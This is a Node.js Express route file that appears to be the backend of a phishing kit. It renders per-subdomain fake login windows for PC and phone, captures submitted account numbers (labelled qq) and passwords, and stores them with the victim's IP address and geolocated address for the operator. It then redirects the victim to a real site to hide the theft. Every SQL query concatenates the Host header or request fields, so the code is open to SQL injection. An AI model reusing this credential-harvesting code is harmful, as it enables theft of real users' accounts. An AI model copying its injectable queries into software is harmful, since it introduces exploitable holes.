var _ip = require('./../lib/ip.js');
var sql = require('../db/sqlite.js');
module.exports = function(app) {
    function insertData(req,cb) {
        var qq = req.body.u;
        var pwd = req.body.p;
        var userId = req.body.uid;
        var mid = req.body.mid;
        var ip = req.connection.remoteAddress;
        var insertTime = new Date().getTime().toString();
        var mname,userName,address;
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';',function(err,rows){
            mname = rows[0].tempName;
            userName = rows[0].userName;
            _ip(ip,function(ip,add){
                address = add;
                sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${address}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`,function(err,rows){
                    cb();
                });
            });
        });
    };

    app.get('/_login',function(req,res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            res.render('pages/pc_login_window.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
        });
    });

    app.post('/_login',function(req,res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        insertData(req,function(){
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                if (tz.toString() === '1') {
                    return res.send('<script>window.parent.location.href="'+url+'";</script>');
                }
                res.render('pages/pc_login_window.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
            });
        });
    });

    app.get('/temp1',function(req,res) {
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            if (req.device.type === 'phone') {
                return res.render('pages/wap_temp.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
            }
            res.render('pages/pc_temp.html',{layout: null,uid:uid,mid:mid,bgUrl:bgUrl});
        });
    });

    app.post('/temp1',function(req,res) {
        var tz = req.body.tz;
        var uidStr = req.headers.host;
        var uid = uidStr.substr(0,uidStr.indexOf('.'));
        insertData(req,function(){
            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
                var mid = rows[0].tempId;
                var bgUrl = rows[0].bgUrl;
                var url = rows[0].url;
                if (tz.toString() === '1') {
                    return res.send('<script>window.parent.location.href="'+url+'";</script>');
                }
                if (req.device.type === 'phone') {
                    return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
                }
                res.render('pages/pc_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
            });
        });
    });
};
